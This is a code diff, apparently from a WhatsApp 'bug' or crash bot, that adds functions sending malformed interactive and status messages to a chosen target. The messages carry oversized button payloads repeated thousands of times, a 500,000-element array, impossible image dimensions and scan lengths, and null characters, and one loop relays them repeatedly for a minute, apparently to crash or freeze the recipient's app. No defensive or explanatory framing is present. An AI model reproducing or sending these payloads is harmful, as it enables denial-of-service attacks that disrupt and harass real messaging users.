+              caption: "ochalex - Executed¿!",
+              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+              fileLength: "634893",
+              height: 1022,
+              width: 1080,
+              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
+              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mediaKeyTimestamp: "1782643133",
+              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+              hasMediaAttachment: true
+            }
+          },
+          body: {
+            text: "\uFFFC",
+          },
+          nativeFlowMessage: {
+            buttons: "{}".repeat(7500),
+          }
+        }
+      }
+    }
+  }, { participant: true })
+
+  const startTime = Date.now();
+  const duration = 1 * 60 * 1000;
+  while (Date.now() - startTime < duration) {
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: {
+          interactiveMessage: {
+            header: {
+              imageMessage: {
+                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+                mimetype: "image/jpeg",
+                caption: "LexzyMods - Iniochamy¿!",
+                fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+                fileLength: "634893",
+                height: 1022,
+                width: 1080,
+                mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+                fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
+                directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+                mediaKeyTimestamp: "1782643133",
+                jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+                hasMediaAttachment: true
+              }
+            },
+            body: {
+              text: "\u0000",
+            },
+            nativeFlowMessage: {
+              buttons: "[]".repeat(9000),
+            }
+          }
+        }
+      }
+    }, { participant: true })
+  }
+
+  await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: {
+          interactiveMessage: {
+            header: {
+              imageMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                mimetype: "image/jpeg",
+                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
+                fileLength: Math.floor(Math.random() * 18446744073709551615),
+                height: 99999,
+                width: 99999,
+                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
+                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
+                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
+                mediaKeyTimestamp: 1776937541,
+                jpegThumbnail: null,
+                caption: "LexzyMods - Executed¿!",
+                firstScanLength: 999999999,
+                firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
+                experimentGroupId: 999999999,
+                interactiveAnnotations: [],
+                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
+                scanLengths: [999999999999, 999999999999, 999999999999, 999999999999],
+                annotations: [],
+                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
+                midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
+              },
+              hasMediaAttachment: true
+            },
+            body: {
+              text: "NanasMuda - BackEraa"
+            },
+            nativeFlowMessage: {
+              buttons: "]".repeat(5000)
+            },
+            nativeFlowMessage: {
+              buttons: Array.from({ length: 500000 }, () => ({}))
+            }
+          }
+        }
+      }
+    }, { participant: true });
+
+const asuw = {
+        messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+            botMetadata: {
+                pluginMetadata: {},
+                richResponseSourcesMetadata: {
+                    sources: []
+                }
+            }
+        },
+        groupStatusMessageV2: {
+            message: {
+                richResponseMessage: {
+                    messageType: 1,
+                    submessages: [
+                        {
+                            messageType: 3,
+                            tableMetadata: {
+                                title: "LexzyMods - Executed¿!",
+                                rows: Array.from({ length: 2000 }, () => ({}))
+                            }
+                        }
+                    ],
+                    unifiedResponse: {
+                        data: JSON.stringify({
+                            response_id: crypto.randomUUID(),
+                            sections: []
+                        })
+                    },
+                    contextInfo: {
+                        forwardingScore: 1,
+                        isForwarded: true,
+                        forwardedAiBotMessageInfo: {
+                            botJid: "NanasXExecutedXAllTeam"
+                        },
+                        forwardOrigin: 3
+                    }
+                }
+            }
+        }
+    };
+
+    const asoww = generateWAMessageFromContent(target, asuw, {});
+
+    await sock.relayMessage(target, asoww, {
+        participant: true,
+    });
 }
 
 async function PrivateNew2027V5(sock, target) {
